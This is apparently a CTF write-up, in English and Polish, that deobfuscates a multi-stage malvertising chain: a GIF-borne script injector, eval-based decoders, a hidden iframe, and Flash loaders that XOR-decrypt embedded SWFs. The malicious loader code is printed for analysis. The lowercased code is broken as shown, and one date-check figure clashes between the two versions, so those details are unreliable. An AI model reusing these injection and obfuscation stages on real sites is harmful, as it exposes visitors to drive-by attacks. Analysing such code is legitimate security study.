## offensive 400 (offensive, 400p)
	
###eng
[pl](#pl-version)

challenge starts on webpage which doesn't contain anything (or it looks like this). but after looking at the source code we spot interesting javacript file (named "ads.js"). after deobfuscation it looked like this:


```javascript
var mnt = function() {
	window.host = location.host;
	window.scheme = 'http://';
	window.getlicenseurl = function() {
		console.log('getting lic url')
		var ax = document.getelementsbytagname('img');
		for (var i = 0; i < ax.length; i++) {
			if (-1 < ax[i].src.indexof(host)) {
				return "http://" + host + "/images/creature.html?adv=900485&o=7927932&m=844431838&creature=629999&yf=infzijzt9brsokjd&click=${click_url_enc}&type=js&pub=openxnat_1569894390&ord=1450370740864";
			}
		}
	};
	callbackonload = function() {
		console.log('callback');
		var ax = xtr.responsetext,
			mn = '/1/',
			cm = '%';
		var data = unescape(ax.substr(3 + ax.indexof(mn)).replace(/[\s]{3}/g, function(b) {
			return cm + string.fromcharcode(b.charcodeat(1) ^ ((scheme.length+1) * 6)) + b[2];
		}));
		var sta = document.createelement('sc' + 'rip' + 't');
		sta.innerhtml = data;
		document.body.appendchild(sta);
	};
	licenserequest = function(command) {
		try {
			console.log('lic request');
			new activexobject(command).getlicensefromurl([], getlicenseurl().replace(scheme, 'http://'))
		} catch (et) {
			return et.number + ''
		}
	};
	suspicious = function() {
		with (xtr = (window.xdomainrequest && (new xdomainrequest) || (new xmlhttprequest)))
			open('get', scheme + host + '/images/9j2bkcujhuttnomcd56dxvmz.gif' + '?t=' + (new date).gettime() + '&id=m8xigp9526a9'), onload = callbackonload, send()
	};
	document.security && 1 && suspicious();
};
mnt();
```

the file was bigger than that, but rest of file wasn't interesting. and i removed licence checking (with function 'licenserequest'), because it wasn't letting me through. by the way, this code could work only under ie (because of activexobject use).

either way we can see that finally `<script>` element is created, and some decrypted data is put into it (gif is downloaded from fixed path, and than data is extracted from it).
i tried to decrypt that gif "manually" with python at first, but quickly i decided to do something simpler and i just replaced `sta.innerhtml = data` to `console.log(data)`.
thanks to this, i reached second stage.

it looked like this:

```javascript
function geta(key) {
	return "3789d132";
}
function getb(key) {
	return "111780a7";
}
function getc(key) {
	return "fbff29";
}
function getd(key) {
	return "b2914faca2";
}

function main(func, idtoprocess) {
    func(idtoprocess)
}
var lvpmn, bisnmljh, window, jeumz;

gwrqmbvp = 'd';

var realmain = 
	(function(idtoprocess) {
        tou8g = kode;
        ua = 'asdfasdfasdf';
        if ((/(msie\ [0-7]\.\d+)/).test(ua)) {
            tou8g = tou8g.slice(0, -1);
        }
        tou8g = tou8g['replace'](/\s/g, '');
        plzla = kfsh(tou8g, lvpmn);

        delete tou8g;
        tou8g = "";
        eval(plzla);
    });
lvpmn = 'oxux5xqxrxoxgxfx';

function kfsh(yp, sr4ze) {
	var ylveolp = "";
	for (var i = 0; i < yp.length / 16; i++) {
		var hqdbqadiqap = rztn(yp.substr((i*16), (i+1)*16), sr4ze);
		ylveolp += uygi(parseint(hqdbqadiqap.substr(8,8),16)) + uygi(parseint(hqdbqadiqap.substr(0,8),16));

	}
    return unescape(ylveolp);
}

function rztn(skox, ghk7) {
	ret = "";
	for (var i = 0; i < skox.length; i+=2) {
		ret += (parseint(skox.charat(i) + skox.charat(i+1), 16) ^ ghk7.charcodeat(i)).tostring(16);
	}
	return ret;
}

function tpc(nojmia) {
    var skox = nojmia.charcodeat(0) + (nojmia.charcodeat(1) << 8) + (nojmia.charcodeat(2) << 16) + (nojmia.charcodeat(3) << 24);
    return isnan(skox) ? 0 : skox;
}

function uygi(skox) {
    var nojmia = string.fromcharcode(skox & 255, skox >> 8 & 255, skox >> 16 & 255, skox >> 24 & 255);
    return nojmia;
}

main(realmain, 'ou5qrogfenaszlaokybe')
```

this code is after small deobfuscation (i changed few function names, did beautification, etc) and cut few checks. similary to previous stage, it was enough to cut few checks and add `console.log(plzla)` instead of `eval(plzla)`. thanks to this i reached another stage.

```javascript
if (document.referrer != "") {
    var iframe = document.createelement("iframe");
    iframe.src = "depress-choose-opportunity-staircase.html";
    iframe.frameborder = 0;
    iframe.width = "1";
    iframe.height = "1";
    document.body.appendchild(iframe);
};
```

this code is after serious deobfuscation and beautification. as you can see, this code only creates ifrema with `depress-choose-opportunity-staircase.html` injected.

so, what can we find under this address?

something like this:

```javascript

window['gwrqmbvp'] = '1';

function xwait(xt) {
    var date = new date();
    var tmpdate = null;
    do {
        tmpdate = new date();
    } while (tmpdate - date < xt);
}

function xtruea() {
    if (navigator.useragent.indexof('tmctf') == -1 && navigator.appversion.indexof('ctf/') == -1) {
        return;
    }
    if (!!window.__ie_devtoolbar_console_command_line || ('__browsertools_console_safefunc' in window)) {
        return;
    }
    var mirtul = '1',
        ci = 'clsid:';
    var txt = '<object classid="' + ci + 'd27cdb6e-ae6d-11cf-96b8-444553540000" allowscriptaccess="always" width="1" height="1" id="23kjsdf">';
    txt = txt + '<param name="movie" value="swf/ywxudhvpzm9uaqbmv6dndo.swf" />';
    txt = txt + '<param name="play" value="true"/>';
    txt = txt + '<param name="flashvars" value="a=' + geta("ekrlsop") + '&b=' + getb("ksllnbqsy") + '&c=' + getc("mpruyazx") + '&d=' + getd("qetiopz") + '" />';
    txt = txt + '<!--[if !ie]>-->';
    txt = txt + '<object type="application/x-shockwave-flash" data="swf/ywxudhvpzm9uaqbmv6dndo.swf" allowscriptaccess=always width="1" height="1">';
    txt = txt + '<param name="movie" value="swf/ywxudhvpzm9uaqbmv6dndo.swf" />';
    txt = txt + '<param name="play" value="true"/>';
    txt = txt + '<param name="flashvars" value="a=' + geta("ekrlsop") + '&b=' + getb("ksllnbqsy") + '&c=' + getc("mpruyazx") + '&d=' + getd("qetiopz") + '" />';
    txt = txt + '<!--<![endif]-->';
    txt = txt + '<!--[if !ie]>--></object><!--<![endif]-->';
    txt = txt + '</object>';
    try {;
    } catch (e) {}
    document.getelementsbytagname("q")[2].innerhtml = txt;
}
xtruea();
xwait(1200);
```

again, this is code after my deobfustation and beautification. so, as you can see, another javascript is being injected. there is some checks (i just removed them) and then some `<object>` is 
pasted into source code. so i downloaded that flash and decompiled. most interesting fragment of it was:

```actionscript
package tmctf {
    import flash.events.*;
    import flash.utils.*;
    import flash.display.*;

    public class main extends sprite {

        private var liil11l:class;

        public function main(){
            this.liil11l = main_liil11l;
            super();
            if (stage){
                this.init();
            } else {
                addeventlistener(event.added_to_stage, this.init);
            };
        }
        private function init(_arg1:event=null):void{
            var _local2:object = loaderinfo(this.root.loaderinfo).parameters.a;
            var _local3:object = loaderinfo(this.root.loaderinfo).parameters.b;
            var _local4:object = loaderinfo(this.root.loaderinfo).parameters.c;
            var _local5:object = loaderinfo(this.root.loaderinfo).parameters.d;
            var _local6:string = (((_local4.tostring() + _local3.tostring()) + _local5.tostring()) + _local2.tostring());
            var _local7:bytearray = (new this.liil11l() as bytearray);
            var _local8:bytearray = li11li.l1l1li(_local7, _local6);
            this.removeeventlistener(event.added_to_stage, this.init);
            var _local9 = "flash.display.loader";
            var _local10:class = (getdefinitionbyname(_local9) as class);
            var _local11:loader = new (_local10)();
            _local11.loadbytes(_local8);
            addchild(_local11);
        }

    }
}//package tmctf 

package tmctf {
    import mx.core.*;

    public class main_liil11l extends bytearrayasset {

    }
}//package tmctf 

package tmctf {
    import flash.utils.*;

    public class li11li {

        public static function l1i1li(_arg1:int):string{
            var _local2 = "";
            if (_arg1 == 1){
                _local2 = "6l.6o3a3d63.b3.y6t263.e5s6";
            };
            if (_arg1 == 2){
                _local2 = "2a.7d6d6.c23h3i.34l6d6";
            };
            if (_arg1 == 3){
                _local2 = "2r4.e6m3.o4v63e3e4v6e3n5t3l6.i3s6t3.4e6n4e3r6";
            };
            if (_arg1 == 4){
                _local2 = "6w3.4r7..i4t6e4.b6y.3t43e5";
            };
            if (_arg1 == 5){
                _local2 = "6p6.3o6s4i6t4i6.o6n";
            };
            if (_arg1 == 8){
                _local2 = "6l2e6n6.g4t4.3h6";
            };
            if (_arg1 == 9){
                _local2 = "3c6h4a..36r34c6o6d34e6a.43t6";
            };
            return (_local2.replace(new regexp("[(1)\\(2)\\(3)\\(4)\\(5)\\(6)\\(7)\\(8)\\(9)\\(0)\\.]", "g"), ""));
        }
        public static function l1l1li(_arg1:bytearray, _arg2:string):bytearray{
            var _local9:int;
            var _local3:* = 0;
            var _local4:bytearray = new bytearray();
            var _local5:string = l1i1li(4);
            var _local6:string = l1i1li(5);
            var _local7:string = l1i1li(8);
            var _local8:string = l1i1li(9);
            _local3 = 0;
            while (_local3 < _arg1[_local7]) {
                if (_local3 > (_arg2[_local7] - 1)){
                    _arg2 = (_arg2 + _arg2);
                };
                _local9 = (_arg1[_local3] ^ _arg2[_local8](_local3));
                var _local10 = _local4;
                _local10[_local5](_local9);
                _local3++;
            };
            _local4[_local6] = 0;
            return (_local4);
        }

    }
}//package tmctf
```

obfuscation here was taken to another level - for example, strings are ovbfuscated (quite simply - function l1i1li removes every digit from string, so for example "6l.6o3a3d63.b3.y6t263.e5s6" changes to "loadbytes"), and function and attribute accesses are obfusacated (for example xxx.length is changed to xxx['length'], and with both techniques combined, to xxx[l1i1li("6l2e6n6.g4t4.3h6")].

after all, main loop is xoring blob extracted from resources with key (key is equal to geta() + getb() + getc() + getd() from previous stage).

i did it (after rewriting core to python), and i get... another swf. so i decompiled it, again... and that's what i get:

```actionscript
yolo = function() {
    var vrsntk = "akstoniskrov";
    
    var aeivra = "sakrxvoiceda";
    
    var createti = "wisttentgaoemric";
    
    var mltoonq = "qdnpokostelim";
    
    var getdate = "tettnagdotmeig";
    
    var getmonth = "ahsttnnogmotmeig";
    
    var tostring = "bgknuimrptxsloot";
    
    var length = "ihntagenseol";
    
    var fromcharcode = "teodsotcrrianhgcfmroormf";
    
    var eval = "sloarvee";
    
    function main()
    {
        var currdate = new date();
        var someconst = 1862628783;
        var mnth = currdate[this.gs(getmonth)]();
        var dayy = currdate[this.gs(getdate)]();
        var modcurrmonth = 2;
        var modcurrday = 30;
        var cheeeck = someconst[this.gs(tostring)](2)[this.gs(length)] - 1;
        if(modcurrmonth * modcurrday != cheeeck * 2)
        {
            console.log(modcurrmonth);
            console.log(modcurrday);
            console.log(cheeeck * 2);
            console.log('nope');
            //return;
        }
        var arrwithdata = [122,109,126,44,104,109,120,109,49,46,66,93,98,(..........a lot of numbers.........),60,46,50,43,37,55];
        var resultxx = "";
        var getchrcode = this.gs(fromcharcode);
        var indexl = 0;
        while(indexl < arrwithdata.length)
        {
            resultxx = resultxx + string[getchrcode](arrwithdata[indexl] ^ modcurrmonth + 1 ^ modcurrday);
            indexl++;
        }
        ej(resultxx,this.gs(eval));
    }
    
    function ej(param1, param2)
    {
        console.log(param2);
        console.log(param1);
        return;
        var _loc3_ = null;
        var _loc4_ = nan;
        var _loc5_ = null;
        if(externalinterface.available)
        {
            _loc3_ = "s";
            _loc5_ = "n" + _loc3_;
            _loc5_ = "n" + _loc3_;
            return externalinterface.call(param2,param1);
        }
        return "";
    }
    
    function gs(param1)
    {
        var _loc2_ = "";
        var _loc3_ = param1.length;
        while(_loc3_ > 0 / 2)
        {
        _loc2_ = _loc2_ + param1["charat"](_loc3_ - 1);
        _loc3_ = _loc3_ - 2;
        }
        return _loc2_;
    }

    main()
}

yolo()
```

this is code after *serious* deobfuscation - originally all names was obfuscated and there were no human-readable strings. as you can see, data is encrypted with current data, but luckili there was another check - month * day == 50 - that reduced number of possibilities to check to only few. thanks to this, i could check every possibility by hand, and i got this:

```javasctipt
var data="nqn5psetmmg6ysiz7m7kimt1fb0cnrav3cutq3ht17idkv4......"
var key="nky";
var str=window.atob(data);
var s=[], j=0, x, res='';
for (var i=0; i<256; i++) {s[i]=i;};for (i=0; i<256; i++) {j=(j+s[i]+key.charcodeat(i % key.length)) % 256;
x=s[i];s[i]=s[j];s[j]=x;};
i=0;j=0;for (var y=0; y<str.length; y++) {i=(i+1) % 256;j=(j+s[i]) % 256;x=s[i];s[i]=s[j];s[j]=x;res += string.fromcharcode(str.charcodeat(y) ^ s[(s[i]+s[j]) % 256]);};
document.write('<img src="data:image/gif;base64,'+res+'" width="0" height="0">');
```

this code is after minimal deobfuscation. i had problems with executing this code (it showed me empty page and nothing more), but luckily friend from team executed this code and volia, we get the flag:


[image extracted text: tmctf{m4lv3rtising-ek}]


###pl version

wchodzimy na stronę na której na pierwszy rzut oka nic nie ma (pseudo-blog). rzuca się w oczy jedynie jakiś javascript na dole strony (nazwany "ads.js"). po deobfuskacji wyglądał mniej więcej tak:


```javascript
var mnt = function() {
	window.host = location.host;
	window.scheme = 'http://';
	window.getlicenseurl = function() {
		console.log('getting lic url')
		var ax = document.getelementsbytagname('img');
		for (var i = 0; i < ax.length; i++) {
			if (-1 < ax[i].src.indexof(host)) {
				return "http://" + host + "/images/creature.html?adv=900485&o=7927932&m=844431838&creature=629999&yf=infzijzt9brsokjd&click=${click_url_enc}&type=js&pub=openxnat_1569894390&ord=1450370740864";
			}
		}
	};
	callbackonload = function() {
		console.log('callback');
		var ax = xtr.responsetext,
			mn = '/1/',
			cm = '%';
		var data = unescape(ax.substr(3 + ax.indexof(mn)).replace(/[\s]{3}/g, function(b) {
			return cm + string.fromcharcode(b.charcodeat(1) ^ ((scheme.length+1) * 6)) + b[2];
		}));
		var sta = document.createelement('sc' + 'rip' + 't');
		sta.innerhtml = data;
		document.body.appendchild(sta);
	};
	licenserequest = function(command) {
		try {
			console.log('lic request');
			new activexobject(command).getlicensefromurl([], getlicenseurl().replace(scheme, 'http://'))
		} catch (et) {
			return et.number + ''
		}
	};
	suspicious = function() {
		with (xtr = (window.xdomainrequest && (new xdomainrequest) || (new xmlhttprequest)))
			open('get', scheme + host + '/images/9j2bkcujhuttnomcd56dxvmz.gif' + '?t=' + (new date).gettime() + '&id=m8xigp9526a9'), onload = callbackonload, send()
	};
	document.security && 1 && suspicious();
};
mnt();
```

były jeszcze mniej ciekawe fragmenty, oraz sprawdzanie licencji przy pomocy funkcji `licenserequest` (które wyciąłem żeby przejść dalej). swoją drogą, kod miał szanse zadziałać tylko na ie (z uwagi na użycie activexobject).

tak czy inaczej, widać że ostatecznie tworzony jest element script, do którego są wrzucane jakieś zdeszyfrowane dane (pobierane z jakiegoś gifa), i który jest dorzucany do kodu strony i wykonywany.
najpierw próbowałem ręcznie przepisać odszyfrowanie tych danych do pythona (co nie było trudne), ale po chwili zdecydowałem się na prostsze rozwiązanie - po prostu podmieniłem linijkę `sta.innerhtml = data` na `console.log(data)`.
dzięki temu przeszliśmy do drugiego stage.

wyglądał on mniej-więcej tak:

```javascript
function geta(key) {
	return "3789d132";
}
function getb(key) {
	return "111780a7";
}
function getc(key) {
	return "fbff29";
}
function getd(key) {
	return "b2914faca2";
}

function main(func, idtoprocess) {
    func(idtoprocess)
}
var lvpmn, bisnmljh, window, jeumz;

gwrqmbvp = 'd';

var realmain = 
	(function(idtoprocess) {
        tou8g = kode;
        ua = 'asdfasdfasdf';
        if ((/(msie\ [0-7]\.\d+)/).test(ua)) {
            tou8g = tou8g.slice(0, -1);
        }
        tou8g = tou8g['replace'](/\s/g, '');
        plzla = kfsh(tou8g, lvpmn);

        delete tou8g;
        tou8g = "";
        eval(plzla);
    });
lvpmn = 'oxux5xqxrxoxgxfx';

function kfsh(yp, sr4ze) {
	var ylveolp = "";
	for (var i = 0; i < yp.length / 16; i++) {
		var hqdbqadiqap = rztn(yp.substr((i*16), (i+1)*16), sr4ze);
		ylveolp += uygi(parseint(hqdbqadiqap.substr(8,8),16)) + uygi(parseint(hqdbqadiqap.substr(0,8),16));

	}
    return unescape(ylveolp);
}

function rztn(skox, ghk7) {
	ret = "";
	for (var i = 0; i < skox.length; i+=2) {
		ret += (parseint(skox.charat(i) + skox.charat(i+1), 16) ^ ghk7.charcodeat(i)).tostring(16);
	}
	return ret;
}

function tpc(nojmia) {
    var skox = nojmia.charcodeat(0) + (nojmia.charcodeat(1) << 8) + (nojmia.charcodeat(2) << 16) + (nojmia.charcodeat(3) << 24);
    return isnan(skox) ? 0 : skox;
}

function uygi(skox) {
    var nojmia = string.fromcharcode(skox & 255, skox >> 8 & 255, skox >> 16 & 255, skox >> 24 & 255);
    return nojmia;
}

main(realmain, 'ou5qrogfenaszlaokybe')
```

to kod już po mojej częściowej deobfuskacji (zmiana nazw kilku funkcji, beautifikacja, etc) i wycięciu checków. tutaj podobnie jak w poprzednim przypadku, wystarczyło wyciąć kilka checków i dodać `console.log(plzla)` zamiast `eval(plzla)`.
dzięki temu otrzymałem kolejny stage.

```javascript
if (document.referrer != "") {
    var iframe = document.createelement("iframe");
    iframe.src = "depress-choose-opportunity-staircase.html";
    iframe.frameborder = 0;
    iframe.width = "1";
    iframe.height = "1";
    document.body.appendchild(iframe);
};
```

(to kod po deobfuskacji). jak widać, po prostu tworzony jest iframe w który wstrzykiwane jest `depress-choose-opportunity-staircase.html`.

co znajudje się pod tym adresem?

mniej więcej taki kod:

```javascript

window['gwrqmbvp'] = '1';

function xwait(xt) {
    var date = new date();
    var tmpdate = null;
    do {
        tmpdate = new date();
    } while (tmpdate - date < xt);
}

function xtruea() {
    if (navigator.useragent.indexof('tmctf') == -1 && navigator.appversion.indexof('ctf/') == -1) {
        return;
    }
    if (!!window.__ie_devtoolbar_console_command_line || ('__browsertools_console_safefunc' in window)) {
        return;
    }
    var mirtul = '1',
        ci = 'clsid:';
    var txt = '<object classid="' + ci + 'd27cdb6e-ae6d-11cf-96b8-444553540000" allowscriptaccess="always" width="1" height="1" id="23kjsdf">';
    txt = txt + '<param name="movie" value="swf/ywxudhvpzm9uaqbmv6dndo.swf" />';
    txt = txt + '<param name="play" value="true"/>';
    txt = txt + '<param name="flashvars" value="a=' + geta("ekrlsop") + '&b=' + getb("ksllnbqsy") + '&c=' + getc("mpruyazx") + '&d=' + getd("qetiopz") + '" />';
    txt = txt + '<!--[if !ie]>-->';
    txt = txt + '<object type="application/x-shockwave-flash" data="swf/ywxudhvpzm9uaqbmv6dndo.swf" allowscriptaccess=always width="1" height="1">';
    txt = txt + '<param name="movie" value="swf/ywxudhvpzm9uaqbmv6dndo.swf" />';
    txt = txt + '<param name="play" value="true"/>';
    txt = txt + '<param name="flashvars" value="a=' + geta("ekrlsop") + '&b=' + getb("ksllnbqsy") + '&c=' + getc("mpruyazx") + '&d=' + getd("qetiopz") + '" />';
    txt = txt + '<!--<![endif]-->';
    txt = txt + '<!--[if !ie]>--></object><!--<![endif]-->';
    txt = txt + '</object>';
    try {;
    } catch (e) {}
    document.getelementsbytagname("q")[2].innerhtml = txt;
}
xtruea();
xwait(1200);
```

(to kod po deobfuskacji.  jak widać, jest wstrzykiwany *kolejny* javascript. znowu jakieś checki (które wyciąłem), a ostatecznie tworzony jest jakiś `<object>` zawierający flasha.

pobrałem więc tego flasha i zdekompilowałem. najciekawszy fragment poniżej:

```actionscript
package tmctf {
    import flash.events.*;
    import flash.utils.*;
    import flash.display.*;

    public class main extends sprite {

        private var liil11l:class;

        public function main(){
            this.liil11l = main_liil11l;
            super();
            if (stage){
                this.init();
            } else {
                addeventlistener(event.added_to_stage, this.init);
            };
        }
        private function init(_arg1:event=null):void{
            var _local2:object = loaderinfo(this.root.loaderinfo).parameters.a;
            var _local3:object = loaderinfo(this.root.loaderinfo).parameters.b;
            var _local4:object = loaderinfo(this.root.loaderinfo).parameters.c;
            var _local5:object = loaderinfo(this.root.loaderinfo).parameters.d;
            var _local6:string = (((_local4.tostring() + _local3.tostring()) + _local5.tostring()) + _local2.tostring());
            var _local7:bytearray = (new this.liil11l() as bytearray);
            var _local8:bytearray = li11li.l1l1li(_local7, _local6);
            this.removeeventlistener(event.added_to_stage, this.init);
            var _local9 = "flash.display.loader";
            var _local10:class = (getdefinitionbyname(_local9) as class);
            var _local11:loader = new (_local10)();
            _local11.loadbytes(_local8);
            addchild(_local11);
        }

    }
}//package tmctf 

package tmctf {
    import mx.core.*;

    public class main_liil11l extends bytearrayasset {

    }
}//package tmctf 

package tmctf {
    import flash.utils.*;

    public class li11li {

        public static function l1i1li(_arg1:int):string{
            var _local2 = "";
            if (_arg1 == 1){
                _local2 = "6l.6o3a3d63.b3.y6t263.e5s6";
            };
            if (_arg1 == 2){
                _local2 = "2a.7d6d6.c23h3i.34l6d6";
            };
            if (_arg1 == 3){
                _local2 = "2r4.e6m3.o4v63e3e4v6e3n5t3l6.i3s6t3.4e6n4e3r6";
            };
            if (_arg1 == 4){
                _local2 = "6w3.4r7..i4t6e4.b6y.3t43e5";
            };
            if (_arg1 == 5){
                _local2 = "6p6.3o6s4i6t4i6.o6n";
            };
            if (_arg1 == 8){
                _local2 = "6l2e6n6.g4t4.3h6";
            };
            if (_arg1 == 9){
                _local2 = "3c6h4a..36r34c6o6d34e6a.43t6";
            };
            return (_local2.replace(new regexp("[(1)\\(2)\\(3)\\(4)\\(5)\\(6)\\(7)\\(8)\\(9)\\(0)\\.]", "g"), ""));
        }
        public static function l1l1li(_arg1:bytearray, _arg2:string):bytearray{
            var _local9:int;
            var _local3:* = 0;
            var _local4:bytearray = new bytearray();
            var _local5:string = l1i1li(4);
            var _local6:string = l1i1li(5);
            var _local7:string = l1i1li(8);
            var _local8:string = l1i1li(9);
            _local3 = 0;
            while (_local3 < _arg1[_local7]) {
                if (_local3 > (_arg2[_local7] - 1)){
                    _arg2 = (_arg2 + _arg2);
                };
                _local9 = (_arg1[_local3] ^ _arg2[_local8](_local3));
                var _local10 = _local4;
                _local10[_local5](_local9);
                _local3++;
            };
            _local4[_local6] = 0;
            return (_local4);
        }

    }
}//package tmctf
```

tutaj obfuskacja poziom wyżej - np. stringi są obfuskowane (w prosty sposób - funkcja l1i1li usuwa po prostu wszystkie cyfry ze stringa, czyli np. "6l.6o3a3d63.b3.y6t263.e5s6" zamienia się w "loadbytes"), oraz wywołania funkcji
i odwołania do atrybutów są obuskowane (np. xxx.length jest zamieniane na xxx['length'], a po połączeniu obu technik na xxx[l1i1li("6l2e6n6.g4t4.3h6")].

tak czy inaczej, ostatecznie główna pętla wykonuje xorowanie bloba wyciągniętego z resourców z kluczem (klucz jest równy geta() + getb() + getc() + getd() z poprzedniego stage).

wykonałem to samo, i otrzymałem... kolejny swf. zdekompilowałem i jego;

```actionscript
yolo = function() {
    var vrsntk = "akstoniskrov";
    
    var aeivra = "sakrxvoiceda";
    
    var createti = "wisttentgaoemric";
    
    var mltoonq = "qdnpokostelim";
    
    var getdate = "tettnagdotmeig";
    
    var getmonth = "ahsttnnogmotmeig";
    
    var tostring = "bgknuimrptxsloot";
    
    var length = "ihntagenseol";
    
    var fromcharcode = "teodsotcrrianhgcfmroormf";
    
    var eval = "sloarvee";
    
    function main()
    {
        var currdate = new date();
        var someconst = 1862628783;
        var mnth = currdate[this.gs(getmonth)]();
        var dayy = currdate[this.gs(getdate)]();
        var modcurrmonth = 2;
        var modcurrday = 30;
        var cheeeck = someconst[this.gs(tostring)](2)[this.gs(length)] - 1;
        if(modcurrmonth * modcurrday != cheeeck * 2)
        {
            console.log(modcurrmonth);
            console.log(modcurrday);
            console.log(cheeeck * 2);
            console.log('nope');
            //return;
        }
        var arrwithdata = [122,109,126,44,104,109,120,109,49,46,66,93,98,(..........a lot of numbers.........),60,46,50,43,37,55];
        var resultxx = "";
        var getchrcode = this.gs(fromcharcode);
        var indexl = 0;
        while(indexl < arrwithdata.length)
        {
            resultxx = resultxx + string[getchrcode](arrwithdata[indexl] ^ modcurrmonth + 1 ^ modcurrday);
            indexl++;
        }
        ej(resultxx,this.gs(eval));
    }
    
    function ej(param1, param2)
    {
        console.log(param2);
        console.log(param1);
        return;
        var _loc3_ = null;
        var _loc4_ = nan;
        var _loc5_ = null;
        if(externalinterface.available)
        {
            _loc3_ = "s";
            _loc5_ = "n" + _loc3_;
            _loc5_ = "n" + _loc3_;
            return externalinterface.call(param2,param1);
        }
        return "";
    }
    
    function gs(param1)
    {
        var _loc2_ = "";
        var _loc3_ = param1.length;
        while(_loc3_ > 0 / 2)
        {
        _loc2_ = _loc2_ + param1["charat"](_loc3_ - 1);
        _loc3_ = _loc3_ - 2;
        }
        return _loc2_;
    }

    main()
}

yolo()
```

(tutaj wszystko już po sporej deobfuskacji - oryginalnie nie było żadnych czytelnych dla człowieka stringów, wszystkie były zaszyfrowane przy pomocy gs(). dane były szyfrowane obecną datą, ale był na szczęście dodatkowy check - miesiąc * dzień był równy 60, co ograniczyło ilość dat do sprawdzenia do ledwo kilku. dzięki temu mogłem ręcznie sprawdzić wszystkie, i otrzymałem kolejny stage.

```javasctipt
var data="nqn5psetmmg6ysiz7m7kimt1fb0cnrav3cutq3ht17idkv4......"
var key="nky";
var str=window.atob(data);
var s=[], j=0, x, res='';
for (var i=0; i<256; i++) {s[i]=i;};for (i=0; i<256; i++) {j=(j+s[i]+key.charcodeat(i % key.length)) % 256;
x=s[i];s[i]=s[j];s[j]=x;};
i=0;j=0;for (var y=0; y<str.length; y++) {i=(i+1) % 256;j=(j+s[i]) % 256;x=s[i];s[i]=s[j];s[j]=x;res += string.fromcharcode(str.charcodeat(y) ^ s[(s[i]+s[j]) % 256]);};
document.write('<img src="data:image/gif;base64,'+res+'" width="0" height="0">');
```


[image extracted text: tmctf{m4lv3rtising-ek}]


(kod po minimalnej deobfuskacji). miałem minimalny problem z uruchomieniem tego (pokazywało u mnie pustą stronę), ale na szcześćie kolega z drużyny wykonał ten kod i volia, otrzymaliśmy flagę.
